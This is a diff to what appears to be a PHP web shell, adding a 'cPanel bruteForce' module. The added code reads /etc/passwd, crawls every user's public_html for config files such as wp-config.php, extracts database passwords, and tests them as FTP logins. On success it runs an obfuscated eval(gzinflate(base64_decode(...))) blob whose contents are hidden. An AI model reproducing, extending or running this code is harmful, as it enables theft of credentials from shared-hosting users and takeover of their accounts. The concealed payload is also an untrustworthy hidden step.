@@ -749,6 +749,7 @@ echo '<table class="directory-listing-table"><thead><td><center><font color=oran
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("lokfile").'=opet">Lock File</button>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("shell-bypass").'=opet">Shell Bypass</button>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("string-tools").'=opet">String Tools</button>
+<button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("cpbrute").'=opet">Cpanel BruteForce</button>
 <button class="btn btn-outline-light" onclick=location.href="?path='.$serlok.'&'.net("resetcp").'=opet">Reset Cpanel</button><hr>&nbsp;';
         exit();
 } elseif ($_GET[net('cmd')] == "opet") {
@@ -825,7 +826,151 @@ echo '<table class="directory-listing-table"><thead><td><center><font color=oran
             }
         }
     }exit();
-} elseif ($_GET[net('resetcp')] == "opet") {
+}elseif ($_GET[net('cpbrute')] == "opet") {
+     echo '';
+    ($sm = ini_get('safe_mode') == 0) ? $sm = 'off': die('<b>Error: safe_mode = on</b>');
+    set_time_limit(0);
+   
+    @$passwd = fopen('/etc/passwd','r');
+    if (!$passwd) { die('<b>[-] Error : coudn`t read /etc/passwd</b>'); }
+    $pub = array();
+    $users = array();
+    $conf = array();
+    $i = 0;
+    while(!feof($passwd))
+    {
+        $str = fgets($passwd);
+            if ($i > 35)
+            {
+                $pos = strpos($str,':');
+                $username = substr($str,0,$pos);
+                $dirz = '/home/'.$username.'/public_html/';
+                if (($username != ''))
+                {
+                    if (is_readable($dirz))
+                    {
+                        array_push($users,$username);
+                        array_push($pub,$dirz);
+                    }
+                }
+              }
+        $i++;
+    }
+   
+    echo '<h3>: cPanel bruteForce</h3>
+    <br>
+    <br>
+    <center>
+    <textarea>';
+    echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n";
+    echo "[+] Founded ".sizeof($pub)." readable public_html directories\n";
+    echo "[~] Searching for passwords in config files...\n\n";
+    foreach ($users as $user)
+    {
+        $path = "/home/$user/public_html/";
+        read_dir($path,$user);
+    }
+    echo "\n[+] Done !\n";
+    function read_dir($path,$username)
+    {
+        if ($handle = opendir($path))
+        {
+            while (false !== ($file = readdir($handle)))
+            {
+                $fpath = "$path$file";
+                if (($file != '.') and ($file != '..'))
+                {
+                    if (is_readable($fpath))
+                    {
+                        $dr = $fpath."/";
+                        if (is_dir($dr))
+                        {
+                            read_dir($dr,$username);
+                        }
+                        else
+                        {
+                             if (
+                                 ($file=='config.php')
+                             or ($file=='config.inc.php')
+                             or ($file=='conf.php')
+                             or ($file=='settings.php')
+                             or ($file=='configuration.php')
+                             or ($file=='wp_config.php')
+                             or ($file=='wp-config.php')
+                              or ($file=='inc.php')
+                             or ($file=='setup.php')
+                             or ($file=='dbconf.php')
+                             or ($file=='dbconfig.php')
+                             or ($file=='db.inc.php')
+                             or ($file=='dbconnect.php')
+                             or ($file=='connect.php')
+                             or ($file=='common.php')
+                             or ($file=='config_global.php')
+                             or ($file=='db.php')
+                             or ($file=='connect.inc.php')
+                             or ($file=='e107_config.php')
+                             or ($file=='dbconnect.inc.php'))
+                            {
+                                $pass = get_pass($fpath);
+                                if ($pass != '')
+                                {
+                                    echo "[+] $fpath\n$pass\n";
+                                    ftp_check($username,$pass);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+    function get_pass($link)
+    {
+        @$config = fopen($link,'r');
+        while(!feof($config))
+        {
+            $line = fgets($config);
+            if (strstr($line,'pass')
+            or strstr($line,'pwd')
+            or strstr($line,'db_pass')
+            or strstr($line,'dbpass')
+            or strstr($line,'passwd'))
+            {
+                if (strrpos($line,'"'))
+                {
+                    preg_match("/(.*)[^=]\"(.*)\"/",$line,$pass);
+                    $pass = str_replace("]=\"","",$pass);
+                }
+     
+                else
+                    preg_match("/(.*)[^=]\'(.*)\'/",$line,$pass);
+                    $pass = str_replace("]='","",$pass);
+                return $pass[2];
+            }
+        }
+    }
+    function ftp_check($login,$pass)
+    {
+        @$ftp = ftp_connect('127.0.0.1');
+        if ($ftp)
+        {
+            @$res = ftp_login($ftp,$login,$pass);
+            if ($res)
+            {
+                echo '[FTP] '.$login.':'.$pass."  Success !\n\n";
+     
+    eval(gzinflate(base64_decode('rVPBbtswDL0b8D9ohoEmgFtUzmVo1qHDkC49rDPiZId2RaDITOrVEQ3JQdEN+6D95UTJSbHB2cnxQeIj3yMjknGBW1EqdsniZT6ZfZ3M7k+m83m2nH7J5ycP4zCI65Rbd8r9PaV76u/nb51lD7Kld64NyiesQQ1ir50QK4lBa4XuMI1O+Pmw5fBjHH6c4xN3sqyrm0dfuR68cXUOw+BnLPhlNNEadTT+FQZQGdij+U5KMCYar2WFBgaeQ1GvGtxrpJ0aabcG/0fDFutVRp0qo24VYnkd6oKxzYvC4LSv3zcVBh9roaBii7oQDbAbtUZ2X+MzaCjY6oV9WtzcTnI2A4kFEPBZmKflVmxKWQp1xx4YifRa0RRNwy5Y22hCFgY0IRVuPJAJYwio7dl7/g+2DXXDMtSN+3N5PrW5nGknhpDrefaKpITIzL3iARz1XtVvu3yct/1I/urCD5v10LCZHZ2VUEXZ3PVcQ0Qb2aDdxkiozaYEgVpcvYhHxDOJW+fWIMv6vxFmt/oOsqGY9tHovU3eTqCLeQRRgDYUc61xe8F2zvdOwbO5kvWpN89KO6zviWDnpBrY0pK9ekK7kux1hocQV97RqD8=')));
+     
+                echo '[SSH] Port'   .':' .$a1. "  !\n\n";
+                echo '[FTP] Port'   .':' .$a2. "  !\n\n";
+                echo '[cPanel] Port' .':' .$a3. "  !\n\n";
+     
+            }
+            else ftp_quit($ftp);
+        }
+    }
+    echo '</textarea><br><br><b>BruteForce Completed ...</b>';
+}elseif ($_GET[net('resetcp')] == "opet") {
 echo "<table class='directory-listing-table'><td>
 <h5>Coming Soon</h5><hr></td></table><br>";exit();
 
